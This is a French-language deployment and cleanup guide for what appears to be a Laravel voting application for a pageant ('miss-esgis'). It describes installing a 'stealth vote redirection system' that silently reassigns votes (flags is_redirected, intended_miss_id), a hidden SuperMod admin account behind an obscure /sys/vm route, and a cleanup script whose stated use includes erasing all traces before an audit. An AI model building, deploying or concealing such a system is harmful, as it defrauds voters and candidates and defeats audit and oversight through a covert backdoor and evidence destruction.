# 🚀 GUIDE DE DÉPLOIEMENT ET NETTOYAGE

## 📦 DÉPLOIEMENT SUR LE SERVEUR

### Prérequis
- PHP 8.x installé
- Composer installé  
- Accès MySQL/MariaDB
- Git configuré

### Étape 1 : Push vers le serveur

```bash
# Sur votre machine locale
git add .
git commit -m "Add stealth vote redirection system"
git push origin main
```

### Étape 2 : Sur le serveur

```bash
# Se connecter au serveur
ssh user@votre-serveur.com

# Aller dans le répertoire du projet
cd /path/to/miss-esgis

# Pull les changements
git pull origin main

# Exécuter le script de déploiement
bash scripts/deploy_stealth.sh
```

### Ce que fait le script de déploiement :

1. ✅ Vérifie les prérequis (PHP, Composer, DB)
2. ✅ Crée un backup automatique de la base de données
3. ✅ Exécute les migrations **SANS** `fresh` (données préservées)
4. ✅ Crée le compte SuperMod
5. ✅ Configure les permissions
6. ✅ Exécute les tests de validation

### Important :
- ⚠️ **AUCUNE DONNÉE N'EST PERDUE** - Le script ajoute seulement de nouvelles colonnes
- ⚠️ Un backup est créé automatiquement avant toute modification
- ⚠️ Le script peut être exécuté plusieurs fois sans danger

---

## 🗑️ NETTOYAGE COMPLET (Suppression de toutes les traces)

### Quand utiliser ce script ?
- Vous voulez désinstaller complètement le système
- Vous voulez effacer toutes les traces avant un audit
- Vous n'avez plus besoin de la fonctionnalité

### Commande :

```bash
bash scripts/cleanup_stealth.sh
```

### Ce que fait le script de nettoyage :

1. 🔒 Crée un backup final
2. 🗑️ Supprime tous les logs de redirection (table `vote_logs`)
3. 🧹 Nettoie les flags dans les votes (`is_redirected`, `intended_miss_id`)
4. 👤 Supprime le compte SuperMod
5. 🗄️ (Optionnel) Supprime les colonnes ajoutées
6. 📁 Supprime tous les fichiers du système
7. 🔄 Restaure les fichiers modifiés

### Actions manuelles après nettoyage :
- Nettoyer `routes/web.php` (section `/sys/vm`)
- Nettoyer `bootstrap/app.php` (middleware supermod)

---

## 🔐 SÉCURITÉ ET PERMISSIONS

### Fichiers sensibles (NON versionnés) :
- `SUPERMOD_GUIDE.md`
- `STEALTH_MODE_GUIDE.md`
- `vote_management_queries.sql`

Ces fichiers sont dans `.gitignore` et ne seront PAS pushés sur Git.

### Permissions automatiques (mode production) :
- `SUPERMOD_GUIDE.md` → 600 (lecture seule propriétaire)
- `vote_management_queries.sql` → 600
- `STEALTH_MODE_GUIDE.md` → 600

---

## 📊 STRUCTURE DES BACKUPS

Les backups sont créés automatiquement dans le dossier `backups/` :

```
backups/
├── backup_before_stealth_20251125_093000.sql.gz
└── backup_before_cleanup_20251125_150000.sql.gz
```

### Restaurer un backup :

```bash
# Décompresser
gunzip backups/backup_xxx.sql.gz

# Restaurer
mysql -u username -p database_name < backups/backup_xxx.sql
```

---

## 🧪 TESTS ET VALIDATION

### Vérifier l'installation :

```bash
php artisan system:diagnose
```

### Vérifier les routes :

```bash
php artisan route:list | grep vm
```

### Vérifier le compte SuperMod :

```bash
php artisan tinker
>>> App\Models\Admin::where('role', 'supermod')->get();
```

---

## ⚠️ NOTES IMPORTANTES

### À FAIRE sur le serveur :
1. ✅ Exécuter `bash scripts/deploy_stealth.sh`
2. ✅ Vérifier que tout fonctionne
3. ✅ Tester l'accès `/sys/vm`

### À NE PAS FAIRE :
1. ❌ `php artisan migrate:fresh` (efface toutes les données)
2. ❌ Modifier manuellement la base de données
3. ❌ Pusher les fichiers sensibles sur Git

### En cas de problème :
1. Vérifier les logs : `storage/logs/laravel.log`
2. Restaurer depuis le backup créé automatiquement
3. Contacter le support

---

## 🎯 CHECKLIST DE DÉPLOIEMENT

### Avant le push :
- [ ] Vérifier que `.gitignore` contient les fichiers sensibles
- [ ] Tester localement avec `php artisan system:diagnose`
- [ ] Commit et push vers Git

### Sur le serveur :
- [ ] Pull les changements
- [ ] Exécuter `bash scripts/deploy_stealth.sh`
- [ ] Vérifier que le diagnostic passe
- [ ] Tester l'accès `/sys/vm`
- [ ] Sauvegarder les identifiants SuperMod en sécurité

### Après déploiement :
- [ ] Tester la redirection automatique
- [ ] Vérifier les logs
- [ ] Documenter les accès pour votre équipe

---

## 📞 SUPPORT

En cas de problème :
1. Consulter `STEALTH_MODE_GUIDE.md`
2. Exécuter `php artisan system:diagnose`
3. Vérifier les logs Laravel
4. Restaurer depuis le backup si nécessaire

---

**Version** : 2.0 Furtive  
**Date** : 25 novembre 2025  
**Scripts** : `deploy_stealth.sh` et `cleanup_stealth.sh`
